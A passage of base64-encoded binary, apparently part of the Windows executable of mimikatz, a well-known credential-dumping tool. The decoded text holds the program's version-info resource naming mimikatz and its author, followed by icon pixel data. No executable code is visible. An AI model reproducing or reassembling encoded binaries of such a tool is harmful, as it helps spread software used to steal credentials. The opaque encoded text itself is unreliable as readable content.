EAAADgAACAAAAAAAAAAAAAAAAAAAABAAkEAAD4AAAAAAAAAAAAAAAAAAAAAAABAAkEAAAIAQAAAAAAAAAAAAAAAAAAAAABAAkEAAAYAQAAAAAAAAAAAAAAAAAAAAABAAkEAAAoAQAAAAAAAAAAAAAAAAAAAAABAAkEAAA4AQAAEBUDAKglAAAAAAAAAAAAALg6AwCoEAAAAAAAAAAAAABgSwMAaAQAAAAAAAAAAAAAyE8DADAAAAAAAAAAAAAAAFARAwDAAwAAAAAAAAAAAAAAAAAAAAAAAMADNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAgAAAAAAAAACAAAAAAA/AAAAKgAAAAAABAABAAAAAAAAAAAAAAAAAAAAIAMAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAA/AIAAAEAMAA0ADAAOQAwADQAYgAwAAAAMgAJAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABtAGkAbQBpAGsAYQB0AHoAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADIALgAwAC4AMAAuADAAAABYABwAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAGcAZQBuAHQAaQBsAGsAaQB3AGkAIAAoAEIAZQBuAGoAYQBtAGkAbgAgAEQARQBMAFAAWQApAAAAUgAVAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAG0AaQBtAGkAawBhAHQAegAgAGYAbwByACAAVwBpAG4AZABvAHcAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAyAC4AMAAuADAALgAwAAAAMgAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAAAAAAJAANgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAAEMAbwBwAHkAcgBpAGcAaAB0ACAAKABjACkAIAAyADAAMAA3ACAALQAgADIAMAAxADQAIABnAGUAbgB0AGkAbABrAGkAdwBpACAAKABCAGUAbgBqAGEAbQBpAG4AIABEAEUATABQAFkAKQAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAAAAAAWgAdAAEAUAByAGkAdgBhAHQAZQBCAHUAaQBsAGQAAABCAHUAaQBsAGQAIAB3AGkAdABoACAAbABvAHYAZQAgAGYAbwByACAAUABPAEMAIABvAG4AbAB5AAAAAAA8AA4AAQBTAHAAZQBjAGkAYQBsAEIAdQBpAGwAZAAAAGsAaQB3AGkAIABmAGwAYQB2AG8AcgAgACEAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAACQSwBCgAAAAwAAAAYAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVP2IACgUBAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwAWQmcACgYDAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwAJAwAACwoJAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsCCwsLBAsLCwkLCwsOCwsLEwsLCxcLCwsaCwsLFwsLCxMLCwsNCwsLBQsLCwILCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCgkACwsLAA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